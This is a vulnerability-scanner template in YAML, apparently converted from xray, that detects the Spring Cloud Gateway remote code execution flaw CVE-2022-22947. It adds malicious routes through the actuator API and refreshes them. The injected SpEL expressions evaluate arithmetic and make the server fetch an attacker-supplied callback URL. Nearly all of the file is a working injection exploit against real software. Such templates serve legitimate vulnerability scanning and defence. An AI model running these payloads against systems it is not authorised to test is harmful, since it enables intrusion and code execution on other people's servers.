id: poc-yaml-spring-cloud-gateway-cve-2022-22947-rce

info:
  name: poc-yaml-spring-cloud-gateway-cve-2022-22947-rce
  author: Kai
  severity: critical
  tags: xray-converted,rce,cve-2022-22947,ct-392828
  reference:
    - https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/

http:
  - raw:
      - |
        GET /actuator/gateway/routes/new_route HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        POST /actuator/gateway/refresh HTTP/1.1
        Host: {{Hostname}}
        content-type: application/json

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        DELETE /actuator/gateway/routes/new_route HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        POST /actuator/gateway/refresh HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        POST /actuator/gateway/routes/new_route HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        { "predicates": [ { "name": "Path", "args": { "_genkey_0": "/{{rand_base(8)}}/**" } } ], "filters": [ { "name": "RewritePath", "args": { "_genkey_0": "#{T(java.lang.Math).multiplyExact({{rand_int(1000, 9999)}},{{rand_int(1000, 9999)}})}", "_genkey_1": "/${path}" } } ], "uri": "https://{{rand_base(8)}}.com", "order": 0 }
        

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 201
  - raw:
      - |
        POST /actuator/gateway/routes/new_route HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        { "predicates": [ { "name": "Path", "args": { "_genkey_0": "/{{rand_base(8)}}/**" } } ], "filters": [ { "name": "RewritePath", "args": { "_genkey_0": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(new java.net.URL(\"{{reverseURL}}\").openStream()))}", "_genkey_1": "/${path}" } } ], "uri": "https://{{rand_base(8)}}.com", "order": 0 }
        

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 201